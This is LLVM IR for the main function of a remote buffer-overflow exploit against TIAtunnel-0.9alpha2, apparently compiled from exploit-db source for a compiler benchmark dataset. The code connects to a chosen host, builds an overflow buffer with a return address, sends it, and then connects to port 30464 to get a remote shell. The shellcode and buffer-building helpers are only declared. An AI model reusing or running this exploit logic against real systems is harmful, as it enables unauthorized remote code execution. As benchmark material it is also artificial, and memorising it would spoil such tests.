; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20902.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_20902.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i32 }

@.str = private unnamed_addr constant [44 x i8] c"\0A  TIAtunnel-0.9alpha2 exploit by qitest1\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"h:p:t:o:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [20 x i8] c"+Host: %s\0A  as: %s\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"+Connecting to %s...\0A\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"  connected\0A\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"+Building buffer with retaddr: %p...\0A\00", align 1
@mybuf = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1
@.str.8 = private unnamed_addr constant [17 x i8] c"+Overflowing...\0A\00", align 1
@.str.9 = private unnamed_addr constant [11 x i8] c"+Zzing...\0A\00", align 1
@.str.10 = private unnamed_addr constant [19 x i8] c"+Getting shell...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i8* null, i8** %12, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %4, align 4
  %15 = icmp eq i32 %14, 1
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @usage(i8* %19)
  br label %21

21:                                               ; preds = %16, %2
  br label %22

22:                                               ; preds = %47, %21
  %23 = load i32, i32* %4, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = call i32 @getopt(i32 %23, i8** %24, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  store i32 %25, i32* %11, align 4
  %26 = load i32, i32* @EOF, align 4
  %27 = icmp ne i32 %25, %26
  br i1 %27, label %28, label %48

28:                                               ; preds = %22
  %29 = load i32, i32* %11, align 4
  switch i32 %29, label %42 [
    i32 104, label %30
    i32 112, label %33
    i32 116, label %36
    i32 111, label %39
  ]

30:                                               ; preds = %28
  %31 = load i8*, i8** @optarg, align 8
  %32 = call i8* @strdup(i8* %31)
  store i8* %32, i8** %12, align 8
  br label %47

33:                                               ; preds = %28
  %34 = load i8*, i8** @optarg, align 8
  %35 = call i32 @atoi(i8* %34)
  store i32 %35, i32* %8, align 4
  br label %47

36:                                               ; preds = %28
  %37 = load i8*, i8** @optarg, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %7, align 4
  br label %47

39:                                               ; preds = %28
  %40 = load i8*, i8** @optarg, align 8
  %41 = call i32 @atoi(i8* %40)
  store i32 %41, i32* %9, align 4
  br label %47

42:                                               ; preds = %28
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 0
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @usage(i8* %45)
  br label %47

47:                                               ; preds = %42, %39, %36, %33, %30
  br label %22

48:                                               ; preds = %22
  %49 = load i8*, i8** %12, align 8
  %50 = icmp eq i8* %49, null
  br i1 %50, label %51, label %56

51:                                               ; preds = %48
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @usage(i8* %54)
  br label %56

56:                                               ; preds = %51, %48
  %57 = load i32, i32* %8, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %64

59:                                               ; preds = %56
  %60 = load i8**, i8*** %5, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 0
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @usage(i8* %62)
  br label %64

64:                                               ; preds = %59, %56
  %65 = load i8*, i8** %12, align 8
  %66 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i64 %68
  %70 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %69, i32 0, i32 0
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %65, i8* %71)
  %73 = load i8*, i8** %12, align 8
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8* %73)
  %75 = load i8*, i8** %12, align 8
  %76 = load i32, i32* %8, align 4
  %77 = call i32 @sockami(i8* %75, i32 %76)
  store i32 %77, i32* %10, align 4
  %78 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @atoi(i8* %81)
  %83 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %83, i64 0
  %85 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = add nsw i32 %86, %82
  store i32 %87, i32* %85, align 8
  %88 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %89 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %88, i64 0
  %90 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %89, i32 0, i32 1
  %91 = load i32, i32* %90, align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0), i32 %91)
  %93 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %93, i64 0
  %95 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %94, i32 0, i32 1
  %96 = load i32, i32* %95, align 8
  %97 = call i32 @do_mybuf(i32 %96)
  %98 = load i32, i32* @mybuf, align 4
  %99 = call i32 @strcat(i32 %98, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0))
  %101 = load i32, i32* %10, align 4
  %102 = load i32, i32* @mybuf, align 4
  %103 = load i32, i32* @mybuf, align 4
  %104 = call i32 @strlen(i32 %103)
  %105 = call i32 @send(i32 %101, i32 %102, i32 %104, i32 0)
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.9, i64 0, i64 0))
  %108 = call i32 @sleep(i32 2)
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.10, i64 0, i64 0))
  %110 = load i8*, i8** %12, align 8
  %111 = call i32 @sockami(i8* %110, i32 30464)
  store i32 %111, i32* %10, align 4
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @shellami(i32 %112)
  %114 = load i32, i32* %3, align 4
  ret i32 %114
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @sockami(i8*, i32) #1

declare dso_local i32 @do_mybuf(i32) #1

declare dso_local i32 @strcat(i32, i8*) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shellami(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
